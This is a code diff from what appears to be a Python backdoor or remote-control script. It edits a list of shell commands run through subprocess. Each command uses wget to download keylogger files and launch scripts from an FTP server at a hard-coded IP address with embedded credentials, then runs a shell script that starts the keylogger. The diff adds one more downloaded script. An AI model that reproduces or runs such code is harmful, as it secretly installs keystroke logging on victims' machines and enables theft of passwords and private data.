@@ -68,7 +68,7 @@ def main():
                               stdin=subprocess.PIPE)
                     #results = results.stdout.read() + results.stderr.read()
             else:
-                action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/start_keylogger.sh', 'sh start_keylogger.sh &']
+                action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/start_keylogger.sh', 'wget ftp://siic:azerty@84.39.49.25/keylogger/keyslooper.sh', 'sh start_keylogger.sh']
                 for i in range(len(action)):
                     results = subprocess.Popen(action[i], shell=True,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
